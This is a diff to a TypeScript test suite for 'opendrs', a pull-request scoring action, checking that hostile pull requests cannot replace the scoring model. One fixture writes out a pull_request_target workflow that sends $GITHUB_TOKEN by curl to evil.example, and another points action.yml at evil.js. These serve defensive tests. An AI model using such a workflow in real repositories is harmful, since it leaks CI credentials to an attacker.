@@ -633,7 +633,7 @@ describe("score-only mode against hostile pull requests", () => {
         {
           ".github/workflows/opendrs-fork.yml": "on: pull_request_target\njobs:\n  steal:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl https://evil.example/$GITHUB_TOKEN\n",
           ".github/workflows/opendrs.yml": "name: opendrs\non: pull_request\njobs: {}\n",
-          ".opendrs/model.json": JSON.stringify({ version: 1, intercept: -50, weights: {}, priors: {} }),
+          ".opendrs/model.json": JSON.stringify({ version: 1, intercept: -20, weights: {}, priors: {} }),
           "action.yml": "runs:\n  using: node24\n  main: evil.js\n",
         },
         "workflows",
@@ -641,7 +641,7 @@ describe("score-only mode against hostile pull requests", () => {
     );
     const result = expectSafeResult(await runScoreJob(fixture), fixture);
     if (result.status !== "scored") throw new Error("expected a score");
-    // The PR's model (intercept -50 would score ~0) is not used: the model comes from the base commit.
+    // The PR's model (intercept -20 would score ~0) is not used: the model comes from the base commit.
     expect(result.model).toBe("default");
     expect(result.score).toBeGreaterThan(0.01);
     expect(result.signals.map((signal) => signal.id)).toContain("paths.blocked");
@@ -744,7 +744,7 @@ describe("score-only mode takes the model from the base commit only", () => {
     const fixture = await forkPullRequest({}, changeOneFile);
     const workingTreeModel = join(fixture.checkoutDir, ".opendrs", "model.json");
     mkdirSync(dirname(workingTreeModel), { recursive: true });
-    writeFileSync(workingTreeModel, JSON.stringify({ version: 1, intercept: -50, weights: {}, priors: {} }));
+    writeFileSync(workingTreeModel, JSON.stringify({ version: 1, intercept: -20, weights: {}, priors: {} }));
     const run = await runScoreJob(fixture);
     rmSync(dirname(workingTreeModel), { recursive: true, force: true });
     expect(run.exitCode).toBe(0);
@@ -758,11 +758,19 @@ describe("score-only mode takes the model from the base commit only", () => {
     const fixture = await forkPullRequest({ ".opendrs/model.json": "{ not a model" }, changeOneFile);
     const run = await runScoreJob(fixture);
     expect(expectSafeResult(run, fixture)).toMatchObject({ status: "scored", model: "default" });
-    expect(run.log).toMatch(/::warning::\.opendrs\/model\.json on the base commit is not a valid model; it is ignored\./);
+    expect(run.log).toMatch(/::warning::\.opendrs\/model\.json on the base commit is not a valid model \(not valid JSON\); it is ignored\./);
+  });
+
+  it("uses the built-in weights, and says which field is wrong, when the base commit's model has a weight out of bounds", async () => {
+    const hugeWeightModel = JSON.stringify({ version: 1, intercept: -2, weights: { "size.churn": -1e6 }, priors: {} });
+    const fixture = await forkPullRequest({ ".opendrs/model.json": hugeWeightModel }, changeOneFile);
+    const run = await runScoreJob(fixture);
+    expect(expectSafeResult(run, fixture)).toMatchObject({ status: "scored", model: "default" });
+    expect(run.log).toMatch(/::warning::\.opendrs\/model\.json on the base commit is not a valid model \(.*weights.*\); it is ignored\./);
   });
 
   it("uses the base commit's valid model, reported as calibrated", async () => {
-    const fixture = await forkPullRequest({ ".opendrs/model.json": JSON.stringify({ version: 1, intercept: -50, weights: {}, priors: {} }) }, changeOneFile);
+    const fixture = await forkPullRequest({ ".opendrs/model.json": JSON.stringify({ version: 1, intercept: -20, weights: {}, priors: {} }) }, changeOneFile);
     const run = await runScoreJob(fixture);
     const result = expectSafeResult(run, fixture);
     expect(result).toMatchObject({ status: "scored", model: "calibrated" });
